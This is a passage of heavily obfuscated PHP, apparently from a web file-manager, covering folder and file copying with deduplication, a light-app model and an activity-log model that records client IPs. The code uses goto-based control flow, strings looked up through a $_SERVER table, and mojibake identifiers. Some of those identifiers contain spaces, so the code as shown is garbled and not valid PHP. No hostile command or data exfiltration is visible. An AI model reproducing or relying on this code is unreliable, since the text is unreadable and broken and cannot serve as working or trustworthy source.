$fÖù‰ÑÒùø = $this->sourceInfoCache($e ° ƒ¢·); $C·åäÖÏÉ„ = $D¶™œ‘²ˆö->listPath($Aåë“ì“ˆø, !1, !0); goto E†š÷ Òìî; E†š÷ Òìî: $e¶¼™¡ÊÜ  = array_merge($C·åäÖÏÉ„[$e¾‚½÷¯ß[73]], $C·åäÖÏÉ„[$e¾‚½÷¯ß[74]]); $e¥Ø¸Šš†’ = $this->_addFiles($D¶™œ‘²ˆö, $C·åäÖÏÉ„[$e¾‚½÷¯ß[73]], $bµ¤¨¸‚¡); $a¦­‘âš” = array(); goto F°²±¤¾Ø†; F°²±¤¾Ø†: foreach ($e¶¼™¡ÊÜ  as &$EÃË¯÷‹–Â) { goto eÔÓ®·½´é; eÔÓ®·½´é: if (isset($e¥Ø¸Šš†’[$EÃË¯÷‹–Â[$e¾‚½÷¯ß[28]]])) { $EÃË¯÷‹–Â = $e¥Ø¸Šš†’[$EÃË¯÷‹–Â[$e¾‚½÷¯ß[28]]]; } $EÃË¯÷‹–Â[$e¾‚½÷¯ß[370]] = $EÃË¯÷‹–Â[$e¾‚½÷¯ß[29]] == $e¾‚½÷¯ß[76]; $EÃË¯÷‹–Â[$e¾‚½÷¯ß[372]] = _get($EÃË¯÷‹–Â, $e¾‚½÷¯ß[160], $e¾‚½÷¯ß[33]); goto Déá›çÅ; Déá›çÅ: $EÃË¯÷‹–Â[$e¾‚½÷¯ß[77]] = _get($EÃË¯÷‹–Â, $e¾‚½÷¯ß[77], 0); $EÃË¯÷‹–Â[$e¾‚½÷¯ß[419]] = _get($EÃË¯÷‹–Â, $e¾‚½÷¯ß[419], 0); if (!isset($EÃË¯÷‹–Â[$e¾‚½÷¯ß[543]]) && $EÃË¯÷‹–Â[$e¾‚½÷¯ß[419]]) { $D ø»ÇˆÜî[$e¾‚½÷¯ß[540]][] = $EÃË¯÷‹–Â[$e¾‚½÷¯ß[419]]; } goto Có’«êË¬å; Có’«êË¬å: if ($b·Ë¯•ÍùÄ) { $D™ñ¸ù­×ó = $this->fileNameExistCache($e ° ƒ¢·, $EÃË¯÷‹–Â[$e¾‚½÷¯ß[28]]); if ($D™ñ¸ù­×ó) { if ($EÃË¯÷‹–Â[$e¾‚½÷¯ß[370]] || $b·Ë¯•ÍùÄ == REPEAT_SKIP) { continue; } if ($b·Ë¯•ÍùÄ == REPEAT_REPLACE) { $BÓ…áÈŒÏ  = $this->sourceInfoCache($D™ñ¸ù­×ó); $cÀÀŠê¬ = $this->fileHistory($BÓ…áÈŒÏ , $EÃË¯÷‹–Â[$e¾‚½÷¯ß[419]], $EÃË¯÷‹–Â[$e¾‚½÷¯ß[77]]); if ($cÀÀŠê¬) { $D ø»ÇˆÜî[$e¾‚½÷¯ß[503]][] = $EÃË¯÷‹–Â[$e¾‚½÷¯ß[419]]; } continue; } else { if ($b·Ë¯•ÍùÄ == REPEAT_RENAME) { $EÃË¯÷‹–Â[$e¾‚½÷¯ß[28]] = $this->fileNameAutoCache($e ° ƒ¢·, $EÃË¯÷‹–Â[$e¾‚½÷¯ß[28]], $b·Ë¯•ÍùÄ, !1); } } } } if (!$EÃË¯÷‹–Â[$e¾‚½÷¯ß[370]] && $EÃË¯÷‹–Â[$e¾‚½÷¯ß[419]]) { $D ø»ÇˆÜî[$e¾‚½÷¯ß[503]][] = $EÃË¯÷‹–Â[$e¾‚½÷¯ß[419]]; } $a¦­‘âš”[] = $this->_makeItemData($EÃË¯÷‹–Â, $fÖù‰ÑÒùø, $EÃË¯÷‹–Â[$e¾‚½÷¯ß[28]]); goto FëÒòğ×ùù; FëÒòğ×ùù: } unset($EÃË¯÷‹–Â); if (!empty($a¦­‘âš”)) { $this->addAll($a¦­‘âš”); } goto aˆ¸‹Î¼¢; aˆ¸‹Î¼¢: $dŠÌ÷Ø¨¯ = $this->_childrenList($e ° ƒ¢·); $dŠÌ÷Ø¨¯ = array_to_keyvalue($dŠÌ÷Ø¨¯, $e¾‚½÷¯ß[28]); foreach ($e¶¼™¡ÊÜ  as $EÃË¯÷‹–Â) { $BÓ…áÈŒÏ  = $dŠÌ÷Ø¨¯[$EÃË¯÷‹–Â[$e¾‚½÷¯ß[28]]]; $d±Ï…òİî = $BÓ…áÈŒÏ [$e¾‚½÷¯ß[369]]; $this->_copyApplyMeta($BÓ…áÈŒÏ , $D ø»ÇˆÜî); if ($EÃË¯÷‹–Â[$e¾‚½÷¯ß[29]] == $e¾‚½÷¯ß[76]) { $EÃË¯÷‹–Â[$e¾‚½÷¯ß[75]] = $D¶™œ‘²ˆö->getPathInner($EÃË¯÷‹–Â[$e¾‚½÷¯ß[75]]); $this->_copyChildTo($D¶™œ‘²ˆö, $EÃË¯÷‹–Â[$e¾‚½÷¯ß[75]], $d±Ï…òİî, $b·Ë¯•ÍùÄ, $D ø»ÇˆÜî, $bµ¤¨¸‚¡); } } goto B’‚òÒ¤ğİ; B’‚òÒ¤ğİ: } private function _addFiles($cõæ©ÛÎÃ‰, $D²éé÷ôÚ¾, $a¯ÔÑù§) { goto eÑÀ¦ìå•‘; eÑÀ¦ìå•‘: $c‹¦ùîåçµ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$D²éé÷ôÚ¾ || count($D²éé÷ôÚ¾) == 0) { return array(); } $a±ÈÛ¯£² = array(); goto a÷ÎØå«„ï; dˆˆ×ˆŠÖ: foreach ($D²éé÷ôÚ¾ as $AÚÈ¦¶Ë˜…) { $d„¦òğ°¯Å[$AÚÈ¦¶Ë˜…[$c‹¦ùîåçµ[28]]] = $AÚÈ¦¶Ë˜…; } return $d„¦òğ°¯Å; goto aÎ°ï·ø‘; aØ…•­Ö‰¥: foreach ($c¯Ëö²ÍøÀ as $e‰‰Ã…ª») { if (!isset($a±ÈÛ¯£²[$e‰‰Ã…ª»[$c‹¦ùîåçµ[163]]])) { continue; } $E‹¹ÒÈƒ› = $a±ÈÛ¯£²[$e‰‰Ã…ª»[$c‹¦ùîåçµ[163]]]; foreach ($E‹¹ÒÈƒ› as &$C‚Š£àˆĞÌ) { $C‚Š£àˆĞÌ[$c‹¦ùîåçµ[419]] = $e‰‰Ã…ª»[$c‹¦ùîåçµ[419]]; $C‚Š£àˆĞÌ[$c‹¦ùîåçµ[543]] = !0; } unset($C‚Š£àˆĞÌ); } $EàÛ’ˆƒ— = array(); foreach ($D²éé÷ôÚ¾ as $BºÑ¬¡ö) { if (isset($BºÑ¬¡ö[$c‹¦ùîåçµ[543]]) && $BºÑ¬¡ö[$c‹¦ùîåçµ[543]]) { continue; } $BšŸµÈ†â = $cõæ©ÛÎÃ‰->getPathInner($BºÑ¬¡ö[$c‹¦ùîåçµ[75]]); $Fö¸»äÁ‹ø = $CË¤ö¾í->addFileMake($BšŸµÈ†â, $BºÑ¬¡ö[$c‹¦ùîåçµ[77]], $BºÑ¬¡ö[$c‹¦ùîåçµ[164]], $BºÑ¬¡ö[$c‹¦ùîåçµ[163]], $BºÑ¬¡ö[$c‹¦ùîåçµ[28]], $a¯ÔÑù§); $EàÛ’ˆƒ—[] = $Fö¸»äÁ‹ø; } goto AÃíºã‹•; CÖëŸô¶³: $CË¤ö¾í = Model($c‹¦ùîåçµ[546]); $c¯Ëö²ÍøÀ = $CË¤ö¾í->where($aº‚—ôåÁ•)->select(); $c¯Ëö²ÍøÀ = $c¯Ëö²ÍøÀ ? $c¯Ëö²ÍøÀ : array(); goto aØ…•­Ö‰¥; a÷ÎØå«„ï: foreach ($D²éé÷ôÚ¾ as &$C‚Š£àˆĞÌ) { goto câÜ¢‘¾; D‡İ—´ùÒÏ: $B³’ÒÎ“é˜ = $cõæ©ÛÎÃ‰->hashMd5($C‚Š£àˆĞÌ[$c‹¦ùîåçµ[75]]); if (strlen($B³’ÒÎ“é˜) > 10 && !isset($a±ÈÛ¯£²[$B³’ÒÎ“é˜])) { $a±ÈÛ¯£²[$B³’ÒÎ“é˜] = array(); } $C‚Š£àˆĞÌ[$c‹¦ùîåçµ[164]] = $FùÀøÕÔÃ; goto FĞ¦İÁªÈŠ; bŒ‰´ÔìÑ©: if (count($a±ÈÛ¯£²[$B³’ÒÎ“é˜]) > 1) { $C‚Š£àˆĞÌ[$c‹¦ùîåçµ[543]] = !0; } goto cë¯ø†á; FĞ¦İÁªÈŠ: $C‚Š£àˆĞÌ[$c‹¦ùîåçµ[163]] = $B³’ÒÎ“é˜; Hook::trigger($c‹¦ùîåçµ[545], $C‚Š£àˆĞÌ); $a±ÈÛ¯£²[$B³’ÒÎ“é˜][] =& $C‚Š£àˆĞÌ; goto bŒ‰´ÔìÑ©; câÜ¢‘¾: Hook::trigger($c‹¦ùîåçµ[544], $C‚Š£àˆĞÌ); $C‚Š£àˆĞÌ[$c‹¦ùîåçµ[75]] = $cõæ©ÛÎÃ‰->getPathInner($C‚Š£àˆĞÌ[$c‹¦ùîåçµ[75]]); $FùÀøÕÔÃ = $cõæ©ÛÎÃ‰->hashSimple($C‚Š£àˆĞÌ[$c‹¦ùîåçµ[75]]); goto D‡İ—´ùÒÏ; cë¯ø†á: } unset($C‚Š£àˆĞÌ); $aº‚—ôåÁ• = array($c‹¦ùîåçµ[163] => array($c‹¦ùîåçµ[7], array_keys($a±ÈÛ¯£²))); goto CÖëŸô¶³; AÃíºã‹•: $CË¤ö¾í->addAll($EàÛ’ˆƒ—); $aº‚—ôåÁ• = array($c‹¦ùîåçµ[163] => array($c‹¦ùîåçµ[7], array_keys($a±ÈÛ¯£²))); $c¯Ëö²ÍøÀ = $CË¤ö¾í->where($aº‚—ôåÁ•)->select(); goto F‘†¿è•Ú; F‘†¿è•Ú: $c¯Ëö²ÍøÀ = $c¯Ëö²ÍøÀ ? $c¯Ëö²ÍøÀ : array(); foreach ($c¯Ëö²ÍøÀ as $e‰‰Ã…ª») { if (!isset($a±ÈÛ¯£²[$e‰‰Ã…ª»[$c‹¦ùîåçµ[163]]])) { continue; } $dÃ¥‹øƒ³ =& $a±ÈÛ¯£²[$e‰‰Ã…ª»[$c‹¦ùîåçµ[163]]]; foreach ($dÃ¥‹øƒ³ as &$C‚Š£àˆĞÌ) { $C‚Š£àˆĞÌ[$c‹¦ùîåçµ[419]] = $e‰‰Ã…ª»[$c‹¦ùîåçµ[419]]; } unset($C‚Š£àˆĞÌ); } $d„¦òğ°¯Å = array(); goto dˆˆ×ˆŠÖ; aÎ°ï·ø‘: } } define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][547], $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][548]); goto B…£·ŠŞëá; b‚çÇ„†‘¨: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\x4c\x69\x67\x68\164\x41\160\x70"; public $modelType = "\x53\x79\163\x74\145\155\117\x70\x74\x69\x6f\156"; public $field = array("\156\x61\155\145", "\x67\162\x6f\x75\x70", "\x64\x65\x73\143", "\143\157\x6e\164\145\x6e\164"); public function listData($AË±Ïõ²Ã¶ = false, $cÛİ‚§Å—ó = "\155\157\144\151\146\171\x54\151\x6d\145", $a‚Ñø”ø‹ = true) { return parent::listData($AË±Ïõ²Ã¶, $cÛİ‚§Å—ó, $a‚Ñø”ø‹); } public function remove($aè¬Ù·¾§È) { $bˆ“öñÊö = $this->findByName($aè¬Ù·¾§È); if (!$bˆ“öñÊö) { return !1; } return parent::remove($bˆ“öñÊö[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][367]]); } public function add($Eß‚ƒ¸¯•) { if ($this->findByName($Eß‚ƒ¸¯•[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][28]])) { return !1; } return parent::insert($Eß‚ƒ¸¯•); } public function update($aÄ¥öÆŒŞ‚, $fˆ³‹™çÑÕ) { $C‡â²Éîğ’ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Fò”¼å™Õí = $this->findByName($aÄ¥öÆŒŞ‚); $A¬¢ÁôÁ½ = $this->findByName($fˆ³‹™çÑÕ[$C‡â²Éîğ’[28]]); if (!$Fò”¼å™Õí || $A¬¢ÁôÁ½ && $A¬¢ÁôÁ½[$C‡â²Éîğ’[367]] != $Fò”¼å™Õí[$C‡â²Éîğ’[367]]) { return !1; } return parent::update($Fò”¼å™Õí[$C‡â²Éîğ’[367]], $fˆ³‹™çÑÕ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\x74\145\155\x5f\x6c\x6f\x67"; protected $dataAuto = array(array("\143\x72\x65\141\x74\145\124\151\155\x65", "\164\151\155\145", "\x69\x6e\x73\x65\162\x74", "\146\165\156\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $fì±‹¸°ºÌ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return array($fì±‹¸°ºÌ[2413] => LNG($fì±‹¸°ºÌ[2414]), $fì±‹¸°ºÌ[2415] => LNG($fì±‹¸°ºÌ[2416]), $fì±‹¸°ºÌ[2047] => LNG($fì±‹¸°ºÌ[2417]), $fì±‹¸°ºÌ[2418] => LNG($fì±‹¸°ºÌ[2419]), $fì±‹¸°ºÌ[2420] => LNG($fì±‹¸°ºÌ[2421]), $fì±‹¸°ºÌ[2422] => LNG($fì±‹¸°ºÌ[2423]), $fì±‹¸°ºÌ[2424] => LNG($fì±‹¸°ºÌ[2425]), $fì±‹¸°ºÌ[2426] => LNG($fì±‹¸°ºÌ[2427]), $fì±‹¸°ºÌ[2078] => LNG($fì±‹¸°ºÌ[2428]), $fì±‹¸°ºÌ[2079] => LNG($fì±‹¸°ºÌ[2429]), $fì±‹¸°ºÌ[2430] => LNG($fì±‹¸°ºÌ[2431]), $fì±‹¸°ºÌ[2432] => LNG($fì±‹¸°ºÌ[2433]), $fì±‹¸°ºÌ[2434] => LNG($fì±‹¸°ºÌ[2435]), $fì±‹¸°ºÌ[2436] => LNG($fì±‹¸°ºÌ[2437]), $fì±‹¸°ºÌ[2076] => LNG($fì±‹¸°ºÌ[2438]), $fì±‹¸°ºÌ[2083] => LNG($fì±‹¸°ºÌ[2439]), $fì±‹¸°ºÌ[2440] => LNG($fì±‹¸°ºÌ[2441]), $fì±‹¸°ºÌ[2442] => LNG($fì±‹¸°ºÌ[2443]), $fì±‹¸°ºÌ[2444] => LNG($fì±‹¸°ºÌ[2445]), $fì±‹¸°ºÌ[2446] => LNG($fì±‹¸°ºÌ[2447]), $fì±‹¸°ºÌ[2086] => LNG($fì±‹¸°ºÌ[2448]), $fì±‹¸°ºÌ[2087] => LNG($fì±‹¸°ºÌ[2449]), $fì±‹¸°ºÌ[2450] => LNG($fì±‹¸°ºÌ[2451]), $fì±‹¸°ºÌ[2452] => LNG($fì±‹¸°ºÌ[2453]), $fì±‹¸°ºÌ[2454] => LNG($fì±‹¸°ºÌ[2455]), $fì±‹¸°ºÌ[2081] => LNG($fì±‹¸°ºÌ[2456]), $fì±‹¸°ºÌ[2457] => LNG($fì±‹¸°ºÌ[2458]), $fì±‹¸°ºÌ[2080] => LNG($fì±‹¸°ºÌ[2459]), $fì±‹¸°ºÌ[2460] => LNG($fì±‹¸°ºÌ[2461]), $fì±‹¸°ºÌ[2462] => LNG($fì±‹¸°ºÌ[2463]), $fì±‹¸°ºÌ[2464] => LNG($fì±‹¸°ºÌ[2464]), $fì±‹¸°ºÌ[2465] => LNG($fì±‹¸°ºÌ[2051]), $fì±‹¸°ºÌ[2466] => LNG($fì±‹¸°ºÌ[2467]), $fì±‹¸°ºÌ[2468] => LNG($fì±‹¸°ºÌ[2469]), $fì±‹¸°ºÌ[2470] => LNG($fì±‹¸°ºÌ[2471]), $fì±‹¸°ºÌ[2472] => LNG($fì±‹¸°ºÌ[2473]), $fì±‹¸°ºÌ[2474] => LNG($fì±‹¸°ºÌ[2475]), $fì±‹¸°ºÌ[2476] => LNG($fì±‹¸°ºÌ[2476]), $fì±‹¸°ºÌ[2477] => LNG($fì±‹¸°ºÌ[2478]), $fì±‹¸°ºÌ[2479] => LNG($fì±‹¸°ºÌ[2480]), $fì±‹¸°ºÌ[2481] => LNG($fì±‹¸°ºÌ[2482]), $fì±‹¸°ºÌ[2483] => LNG($fì±‹¸°ºÌ[2484]), $fì±‹¸°ºÌ[2485] => LNG($fì±‹¸°ºÌ[2486]), $fì±‹¸°ºÌ[2487] => LNG($fì±‹¸°ºÌ[2488])); } private function typeFile() { $AÜ¿­êâó =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d•ÑÅôÂŸ = array($AÜ¿­êâó[2083] => array($AÜ¿­êâó[2084]), $AÜ¿­êâó[2434] => array($AÜ¿­êâó[2489]), $AÜ¿­êâó[2436] => array($AÜ¿­êâó[2490]), $AÜ¿­êâó[2076] => array($AÜ¿­êâó[2077]), $AÜ¿­êâó[2442] => array(), $AÜ¿­êâó[2444] => array(), $AÜ¿­êâó[2446] => array(), $AÜ¿­êâó[2086] => array($AÜ¿­êâó[2088]), $AÜ¿­êâó[2087] => array($AÜ¿­êâó[2088]), $AÜ¿­êâó[2450] => array($AÜ¿­êâó[2491]), $AÜ¿­êâó[2452] => array($AÜ¿­êâó[2491]), $AÜ¿­êâó[2454] => array($AÜ¿­êâó[2492]), $AÜ¿­êâó[2440] => array($AÜ¿­êâó[2493]), $AÜ¿­êâó[2081] => array($AÜ¿­êâó[2494]), $AÜ¿­êâó[2457] => array($AÜ¿­êâó[2495]), $AÜ¿­êâó[2080] => array($AÜ¿­êâó[2082])); return $d•ÑÅôÂŸ; } private function typeAll() { goto eàÔÃ­½¢È; B‹÷ Æò²: return $DŒí×ÂİùÌ; goto A‹Íë¿™ö«; D¯¯¬ªİ«Ú: foreach ($d‡…éÏÉ‡Õ as $c¿ªÃ¢°Ò => $EÊ¦â¿“İ) { $DŒí×ÂİùÌ[$EÊ¦â¿“İ[0]] = $DŒí×ÂİùÌ[$c¿ªÃ¢°Ò]; } $DŒí×ÂİùÌ[$AŒ›õ™„ôŸ[2088]] = LNG($AŒ›õ™„ôŸ[2496]); $DŒí×ÂİùÌ[$AŒ›õ™„ôŸ[2491]] = LNG($AŒ›õ™„ôŸ[2497]); goto B‹÷ Æò²; eàÔÃ­½¢È: $AŒ›õ™„ôŸ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $DŒí×ÂİùÌ = $this->typeList; $d‡…éÏÉ‡Õ = array_filter($this->typeFile()); goto D¯¯¬ªİ«Ú; A‹Íë¿™ö«: } public function addLog($BæÙ†ÀŠ, $dïÜÜøïß‡ = array()) { goto a¹›ì‡Ë‚È; a¹›ì‡Ë‚È: $A‰†ÉÛä§ö =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!isset($this->typeList[$BæÙ†ÀŠ])) { return; } $d“ºƒó ©Ì = defined($A‰†ÉÛä§ö[427]) && USER_ID ? USER_ID : (isset($dïÜÜøïß‡[$A‰†ÉÛä§ö[1437]]) ? $dïÜÜøïß‡[$A‰†ÉÛä§ö[1437]] : 0); goto D¢‰ï‚¸…Ñ; D¢‰ï‚¸…Ñ: if (!$d“ºƒó ©Ì) { $d“ºƒó ©Ì = (int) Session::get($A‰†ÉÛä§ö[2228]); } $dò”Ô¿Å = get_client_ip(); if (!$dïÜÜøïß‡ || strlen(json_encode($dïÜÜøïß‡)) >= 1024) { $dïÜÜøïß‡ = array($A‰†ÉÛä§ö[2498] => $dò”Ô¿Å); } else { if (is_array($dïÜÜøïß‡)) { $dïÜÜøïß‡[$A‰†ÉÛä§ö[2498]] = $dò”Ô¿Å; } else { $dïÜÜøïß‡ = array($A‰†ÉÛä§ö[1031] => $dïÜÜøïß‡, $A‰†ÉÛä§ö[2498] => $dò”Ô¿Å); } } goto BÌèçÀ¸ÎÊ; BÌèçÀ¸ÎÊ: $dïÜÜøïß‡ = array($A‰†ÉÛä§ö[1427] => Session::sign(), $A‰†ÉÛä§ö[1428] => $d“ºƒó ©Ì, $A‰†ÉÛä§ö[29] => $BæÙ†ÀŠ, $A‰†ÉÛä§ö[1430] => json_encode($dïÜÜøïß‡)); parent::add($dïÜÜøïß‡); goto d´¬”½Ÿ; d´¬”½Ÿ: } public function remove($Cñ¢›æÎÄ) { $this->where(array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][385] => $Cñ¢›æÎÄ))->delete(); } private function _makeOrder($a˜Ï×š‘Î§ = '') { goto bŠ£«ìå…µ; C©¶òÁ‚‡•: return $this->order($a˜Ï×š‘Î§); goto d¦…âÂÕŸâ; A…õ¨à¨·’: $D‚Û­‡èì = Input::get($e›×š‚¤¾[408], $e›×š‚¤¾[7], $e›×š‚¤¾[2262], array($e›×š‚¤¾[2188], $e›×š‚¤¾[404])); $D‚Û­‡èì = $fŞ’ÎóÃ÷Ì[$D‚Û­‡èì]; $a˜Ï×š‘Î§ = $a˜Ï×š‘Î§ . "{$dŸ­Ñõ½Éõ}\x20{$D‚Û­‡èì}"; goto C©¶òÁ‚‡•; bŠ£«ìå…µ: $e›×š‚¤¾ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dŸ­Ñõ½Éõ = $e›×š‚¤¾[187]; $fŞ’ÎóÃ÷Ì = array($e›×š‚¤¾[402] => $e›×š‚¤¾[403], $e›×š‚¤¾[404] => $e›×š‚¤¾[405]); goto A…õ¨à¨·’; d¦…âÂÕŸâ: } public function get($e—íøî–¹£ = '') { goto BÂ·¡Í©øŒ; BÃäµ®„‘õ: if (!empty($e—íøî–¹£[$FåƒÌ‹°Ø[2498]])) { $FÛ©ÎªÒõ[$FåƒÌ‹°Ø[405]] = array($FåƒÌ‹°Ø[753], "\45{$e—íøî–¹£[$FåƒÌ‹°Ø[2498]]}\45"); } $e®ĞŒ°¬ª = $this->_makeOrder()->where($FÛ©ÎªÒõ)->selectPage(); if (empty($e®ĞŒ°¬ª[$FåƒÌ‹°Ø[354]])) { show_json(array(), !0, $e®ĞŒ°¬ª[$FåƒÌ‹°Ø[351]]); } goto b™¯Ûô; BÂ·¡Í©øŒ: $FåƒÌ‹°Ø =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$e—íøî–¹£) { show_json(array()); } $FÛ©ÎªÒõ = array(); goto CÔ¹š‰©”À; CÔ¹š‰©”À: if ($e—íøî–¹£[$FåƒÌ‹°Ø[1437]]) { $FÛ©ÎªÒõ[$FåƒÌ‹°Ø[1437]] = $e—íøî–¹£[$FåƒÌ‹°Ø[1437]]; } if (isset($e—íøî–¹£[$FåƒÌ‹°Ø[696]])) { $A‘¾İ‚ÌˆÖ = $e—íøî–¹£[$FåƒÌ‹°Ø[696]]; $CÕ…Ó¿Â‡á = isset($e—íøî–¹£[$FåƒÌ‹°Ø[449]]) ? $e—íøî–¹£[$FåƒÌ‹°Ø[449]] : time(); $FÛ©ÎªÒõ[$FåƒÌ‹°Ø[187]] = array($FåƒÌ‹°Ø[321], array($A‘¾İ‚ÌˆÖ, $CÕ…Ó¿Â‡á)); } if ($e—íøî–¹£[$FåƒÌ‹°Ø[29]]) { $aÁ®ë»Í = explode($FåƒÌ‹°Ø[47], $e—íøî–¹£[$FåƒÌ‹°Ø[29]]); $Cá³İ­öˆ = $this->typeFile(); $e‚Œ­Ù—æÏ = array(); foreach ($aÁ®ë»Í as $c½¤¼Ÿé÷ç) { $e‚Œ­Ù—æÏ[] = $c½¤¼Ÿé÷ç; if (isset($Cá³İ­öˆ[$c½¤¼Ÿé÷ç])) { $e‚Œ­Ù—æÏ = array_merge($e‚Œ­Ù—æÏ, $Cá³İ­öˆ[$c½¤¼Ÿé÷ç]); } } $e‚Œ­Ù—æÏ = array_unique($e‚Œ­Ù—æÏ); if ($e‚Œ­Ù—æÏ) { $FÛ©ÎªÒõ[$FåƒÌ‹°Ø[29]] = array($FåƒÌ‹°Ø[7], $e‚Œ­Ù—æÏ); } } goto BÃäµ®„‘õ; b™¯Ûô: $e®ĞŒ°¬ª[$FåƒÌ‹°Ø[354]] = $this->logList($e®ĞŒ°¬ª[$FåƒÌ‹°Ø[354]]); return $e®ĞŒ°¬ª; goto C’òÃ‘ãÆ; C’òÃ‘ãÆ: } private function ipAddress(&$F¶ƒğ¦£¯œ) { $BÄÄêğ²‡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!empty($F¶ƒğ¦£¯œ[$BÄÄêğ²‡[2498]])) { $Aø´´å¬Œ = IpLocation::get($F¶ƒğ¦£¯œ[$BÄÄêğ²‡[2498]]); } else { $Aø´´å¬Œ = LNG($BÄÄêğ²‡[2499]); } $F¶ƒğ¦£¯œ[$BÄÄêğ²‡[2500]] = $Aø´´å¬Œ; } private function descZipDownload($d†øáÒªœœ, &$A®»Ò¥½ô) { $AÑ„š•Óö =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!isset($d†øáÒªœœ[$AÑ„š•Óö[2501]])) { return; } $aºì¡êƒ© = json_decode($d†øáÒªœœ[$AÑ„š•Óö[2501]], !0); foreach ($aºì¡êƒ© as $B§ìÍ’–Å) { if (!IO::init($B§ìÍ’–Å[$AÑ„š•Óö[75]])) { continue; } if (!($D§››÷Œ = IO::infoFull($B§ìÍ’–Å[$AÑ„š•Óö[75]]))) { continue; } $d†øáÒªœœ[$AÑ„š•Óö[75]] = $B§ìÍ’–Å[$AÑ„š•Óö[75]]; $A®»Ò¥½ô[] = $d†øáÒªœœ[$AÑ„š•Óö[369]] = $D§››÷Œ[$AÑ„š•Óö[369]]; $A®»Ò¥½ô[] = $d†øáÒªœœ[$AÑ„š•Óö[2317]] = $D§››÷Œ[$AÑ„š•Óö[463]]; break; } return $d†øáÒªœœ; } private function getSourceList(&$CˆÙß‡ÛùÍ) { $fš‰¿×Ğõ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bï­·Œ”÷Ğ = array(); foreach ($CˆÙß‡ÛùÍ as $E²§Ë®ì·Œ => $f³‡·ˆÄ¼») { goto A‰…Ó¹À¶; A‰…Ó¹À¶: $b„Š÷Ğ£áØ = json_decode($f³‡·ˆÄ¼»[$fš‰¿×Ğõ[405]], !0); if ($f³‡·ˆÄ¼»[$fš‰¿×Ğõ[29]] == $fš‰¿×Ğõ[2079]) { $b„Š÷Ğ£áØ = $this->descZipDownload($b„Š÷Ğ£áØ, $bï­·Œ”÷Ğ); $CˆÙß‡ÛùÍ[$E²§Ë®ì·Œ][$fš‰¿×Ğõ[405]] = json_encode($b„Š÷Ğ£áØ); continue; } if (strpos($f³‡·ˆÄ¼»[$fš‰¿×Ğõ[29]], $fš‰¿×Ğõ[2318]) !== 0) { goto F¹Ìâ‰…¦í; cùˆ¦áàÂæ: continue; goto Cèç‘½¿†¬; F¹Ìâ‰…¦í: if (!isset($b„Š÷Ğ£áØ[$fš‰¿×Ğõ[75]]) || strpos($f³‡·ˆÄ¼»[$fš‰¿×Ğõ[29]], $fš‰¿×Ğõ[2502]) !== 0) { continue; } if (!IO::init($b„Š÷Ğ£áØ[$fš‰¿×Ğõ[75]])) { continue; } if (!($c³–çÅÃÒÙ = IO::infoFull($b„Š÷Ğ£áØ[$fš‰¿×Ğõ[75]]))) { continue; } goto A‡š“Áçƒò; A‡š“Áçƒò: $bï­·Œ”÷Ğ[] = $b„Š÷Ğ£áØ[$fš‰¿×Ğõ[369]] = $c³–çÅÃÒÙ[$fš‰¿×Ğõ[369]]; $bï­·Œ”÷Ğ[] = $b„Š÷Ğ£áØ[$fš‰¿×Ğõ[2317]] = $c³–çÅÃÒÙ[$fš‰¿×Ğõ[463]]; $CˆÙß‡ÛùÍ[$E²§Ë®ì·Œ][$fš‰¿×Ğõ[405]] = json_encode($b„Š÷Ğ£áØ); goto cùˆ¦áàÂæ; Cèç‘½¿†¬: } goto b¼¼‹Ş—È; e¢Ëãèå´: if ($b„Š÷Ğ£áØ[$fš‰¿×Ğõ[29]] == $fš‰¿×Ğõ[2325]) { $bï­·Œ”÷Ğ[] = $b„Š÷Ğ£áØ[$fš‰¿×Ğõ[405]][$fš‰¿×Ğõ[369]]; } goto AğÎÒí…ó¶; b¼¼‹Ş—È: $bï­·Œ”÷Ğ[] = $b„Š÷Ğ£áØ[$fš‰¿×Ğõ[369]]; $bï­·Œ”÷Ğ[] = $b„Š÷Ğ£áØ[$fš‰¿×Ğõ[2317]]; if ($b„Š÷Ğ£áØ[$fš‰¿×Ğõ[29]] == $fš‰¿×Ğõ[494]) { $bï­·Œ”÷Ğ[] = $b„Š÷Ğ£áØ[$fš‰¿×Ğõ[405]][$fš‰¿×Ğõ[1004]]; $bï­·Œ”÷Ğ[] = $b„Š÷Ğ£áØ[$fš‰¿×Ğõ[405]][$fš‰¿×Ğõ[1005]]; } goto e¢Ëãèå´; AğÎÒí…ó¶: } if (!$bï­·Œ”÷Ğ) { return array(); } return Model($fš‰¿×Ğõ[754])->sourceListInfo($bï­·Œ”÷Ğ, !0); } private function logList($BøÉˆÖ¹¥Œ) { goto Eˆ¾Íõóò; fãÄ·‘ôƒè: $FÆƒ¾¨ ã = array(); foreach ($BøÉˆÖ¹¥Œ as $BÌ«ÈÄ³¿• => $Bâ‹°„öÎ) { goto fÆÎ†°‚Á¡; c¬¼ÎÂËÀ: unset($Bâ‹°„öÎ[$E‚Å›Ïƒ—[2505]]); $eãÇì£‘Ì[] = $Bâ‹°„öÎ; goto e‹éÂˆÆò¨; Cï‡ïâ´Ì: $this->ipAddress($Bâ‹°„öÎ); if (strpos($e¶ÒµòŒ”µ, $E‚Å›Ïƒ—[2318]) === 0 || isset($aîÃÊĞí[$E‚Å›Ïƒ—[2317]])) { goto eğá¢É¸µ‹; eğá¢É¸µ‹: $aîÃÊĞí[$E‚Å›Ïƒ—[391]] = $DÓ…àó ª¦[$aîÃÊĞí[$E‚Å›Ïƒ—[369]]]; 